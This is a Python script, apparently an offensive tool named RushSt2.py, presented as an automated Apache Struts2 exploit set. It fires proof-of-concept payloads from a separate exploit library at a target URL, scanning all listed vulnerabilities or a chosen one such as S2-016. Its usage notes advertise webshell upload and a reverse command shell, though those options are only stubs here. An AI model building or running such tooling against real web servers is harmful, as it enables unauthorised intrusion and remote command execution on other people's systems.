'''
RushSt2.py -u www.abcdefg.com/login.action
RushSt2.py -f url_list.txt
RushSt2.py -u www.abcdefg.com/login.action -e S2-016
RushSt2.py -u www.abcdefg.com/login.action -m POST
RushSt2.py -u www.abcdefg.com/login.action --upload C:/webshell.jsp
RushSt2.py -u www.abcdefg.com/login.action --cmd-shell
'''
import requests
from ExpLib import ExpList
import argparse

#Init Global Variables
AvailableEXP = []
TargetURL = ""
ExpVersion = ""
HTTPMethod = ""
AttackVector = ""

def initAvailableExp():
	for exp in ExpList:
		AvailableEXP.append(exp.upper())

def PoC_GET(TargetURL, ExpVersion):
	response = requests.get(TargetURL+ExpList[ExpVersion]["PoC"]).content.decode("utf-8").strip()
	return response

def PoC_POST(TargetURL, ExpVersion):
	pass

def PoC_Sniper(TargetURL, ExpVersion, HTTPMethod):
	print("PoCing...")
	if HTTPMethod == "GET":
		return PoC_GET(TargetURL, ExpVersion)
	else:
		return PoC_POST(TargetURL, ExpVersion)

def PoC_Scan(TargetURL, HTTPMethod):
	ExpResult = {}
	for exp in ExpList:
		ExpResult[exp] = len(PoC_Sniper(TargetURL, exp, HTTPMethod))
	return ExpResult

def exploit(TargetURL, ExpVersion, HTTPMethod):
	if ExpVersion == "ALL":
		#PoC Scan for all vulnerabilities
		print(PoC_Scan(TargetURL, HTTPMethod))
	else:
		#Pre-defined exploit
		print(PoC_Sniper(TargetURL, ExpVersion, HTTPMethod))


#Initialise Exploit Database
initAvailableExp()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Automated Struts2 Exploit Set")
	parser.add_argument("-u","--url", help="Target Vulnerable URL", required=True)
	parser.add_argument("-e","--exploit", help="Exploit Version Choice ( default: Scan for all )")
	parser.add_argument("-m","--method", help="HTTP Method: [GET / POST] ( default: GET )")
	parser.add_argument("--file-upload", help="File Upload")
	parser.add_argument("--cmd-shell", help="Bounces back a command shell")
	args = vars(parser.parse_args())
	#--URL: Add protocol prefix
	if "http://" not in args["url"] and "https://" not in args["url"]:
		TargetURL = "http://" + args["url"]
	else:
		TargetURL = args["url"]
	#Check if argument "Method" has been set, defaults to GET Method
	if args["method"] == None or args["method"] == "GET":
		HTTPMethod = "GET"
	elif args["method"].upper() == "POST":
		HTTPMethod = "POST"
	else:
		print("HTTP Method not Supported. Use GET or POST")
		exit()
	#--EXPLOIT
	if args["exploit"] == None:
		#If the Exploit option is not set
		ExpVersion = "ALL"
	elif args["exploit"].upper() in AvailableEXP:
		ExpVersion = args["exploit"].upper()
	else:
		print("Exploit not found in database!")
		exit()


	print("All Set:\n\tTarget URL:\t%s\n\tHTTP Method:\t%s\n\tExploit:\t%s\n\tAttack Vector:\t%s" %(TargetURL,HTTPMethod,ExpVersion,AttackVector))

	exploit(TargetURL, ExpVersion, HTTPMethod)